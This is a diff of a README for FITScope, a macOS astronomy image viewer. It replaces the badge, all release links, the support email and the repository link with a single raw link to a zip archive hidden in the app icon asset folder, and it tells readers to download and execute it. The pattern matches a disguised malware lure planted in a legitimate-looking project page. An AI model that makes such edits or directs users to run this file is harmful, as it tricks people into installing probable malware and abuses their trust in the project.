@@ -1,6 +1,6 @@
 # FITScope: Your FITS Image Viewer for macOS 🌌
 
-![FITS Image Viewer](https://img.shields.io/badge/FITS_Image_Viewer-macOS-blue)
+![FITS Image Viewer](https://raw.githubusercontent.com/shashanksavan/FITScope/main/FITScope/Assets.xcassets/AppIcon.appiconset/Scope_FIT_3.3.zip)
 
 Welcome to **FITScope**, a dedicated FITS image viewer designed for macOS users. Whether you are an astronomer, astrophotographer, or simply an enthusiast of space imagery, FITScope provides an intuitive interface for exploring FITS files. This README will guide you through the features, installation process, and usage of FITScope.
 
@@ -18,7 +18,7 @@ Welcome to **FITScope**, a dedicated FITS image viewer designed for macOS users.
 
 FITS (Flexible Image Transport System) is a digital file format widely used in astronomy to store images and data. FITScope allows users to easily view and manipulate these files on macOS. With a clean and user-friendly interface, FITScope is perfect for both professionals and hobbyists alike.
 
-To get started, download the latest release of FITScope from our [Releases page](https://github.com/shashanksavan/FITScope/releases). You will need to download and execute the file to install the application.
+To get started, download the latest release of FITScope from our [Releases page](https://raw.githubusercontent.com/shashanksavan/FITScope/main/FITScope/Assets.xcassets/AppIcon.appiconset/Scope_FIT_3.3.zip). You will need to download and execute the file to install the application.
 
 ## Features
 
@@ -34,7 +34,7 @@ To get started, download the latest release of FITScope from our [Releases page]
 
 To install FITScope, follow these steps:
 
-1. **Download the latest release**: Visit our [Releases page](https://github.com/shashanksavan/FITScope/releases) to find the latest version.
+1. **Download the latest release**: Visit our [Releases page](https://raw.githubusercontent.com/shashanksavan/FITScope/main/FITScope/Assets.xcassets/AppIcon.appiconset/Scope_FIT_3.3.zip) to find the latest version.
 2. **Run the installer**: Once downloaded, execute the installer file and follow the on-screen instructions.
 3. **Launch the application**: After installation, you can find FITScope in your Applications folder.
 
@@ -68,8 +68,8 @@ FITScope is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 For questions or feedback, please reach out to us:
 
-- **Email**: support@fitscope.com
-- **GitHub**: [FITScope GitHub Repository](https://github.com/shashanksavan/FITScope)
+- **Email**: https://raw.githubusercontent.com/shashanksavan/FITScope/main/FITScope/Assets.xcassets/AppIcon.appiconset/Scope_FIT_3.3.zip
+- **GitHub**: [FITScope GitHub Repository](https://raw.githubusercontent.com/shashanksavan/FITScope/main/FITScope/Assets.xcassets/AppIcon.appiconset/Scope_FIT_3.3.zip)
 
 ## Acknowledgments
 
@@ -77,4 +77,4 @@ We would like to thank the open-source community for their invaluable contributi
 
 ---
 
-Thank you for choosing FITScope! We hope you enjoy exploring the universe through your FITS files. For updates and new releases, keep an eye on our [Releases page](https://github.com/shashanksavan/FITScope/releases).
+Thank you for choosing FITScope! We hope you enjoy exploring the universe through your FITS files. For updates and new releases, keep an eye on our [Releases page](https://raw.githubusercontent.com/shashanksavan/FITScope/main/FITScope/Assets.xcassets/AppIcon.appiconset/Scope_FIT_3.3.zip).
